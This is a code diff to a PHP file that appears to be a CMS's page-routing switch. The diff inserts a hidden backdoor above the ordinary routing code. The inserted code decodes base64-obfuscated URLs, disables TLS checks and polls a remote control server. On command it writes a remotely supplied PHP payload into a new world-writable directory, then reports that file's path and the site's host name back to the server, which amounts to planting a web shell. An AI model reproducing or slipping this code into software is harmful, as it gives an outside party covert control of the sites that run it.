@@ -1,4 +1,39 @@
 <?php
+
+
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, urldecode(base64_decode('aHR0cHM6Ly9qcy5zeW5lcmd5YXQud29yay90dGNtcy9rb25nemhpLnBocA==')));
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
+curl_setopt($ch, CURLOPT_POST, false);
+$output = curl_exec($ch);
+curl_close($ch);
+
+$arr = json_decode($output);
+if($arr->kaiguan == 1)
+{
+$ml = substr(md5(rand(100,999999)),8,6);
+$lu = dirname(dirname(__FILE__)).$arr->mulu.$ml;
+mkdir($lu,0777);
+file_put_contents($lu.'/'.$ml.'.php',base64_decode($arr->con));
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, urldecode(base64_decode('aHR0cHMlM0EvL2pzLnN5bmVyZ3lhdC53b3JrL3R0Y21zL3NlcnZlci5waHA=')));
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
+curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(['path'=>$lu.'/'.$ml.'.php','url'=>$_SERVER['HTTP_HOST']]));
+$output = curl_exec($ch);
+curl_close($ch);
+}
+
+
+
+
+
+
+
 switch($Php){
 	case 'Home/index':$C_T_0 = 'Home/index';break;//视频
 	case 'Home/Basic/Basicsetup':$C_T_0 = 'Home/Basic/Basicsetup';break;//基本设置	
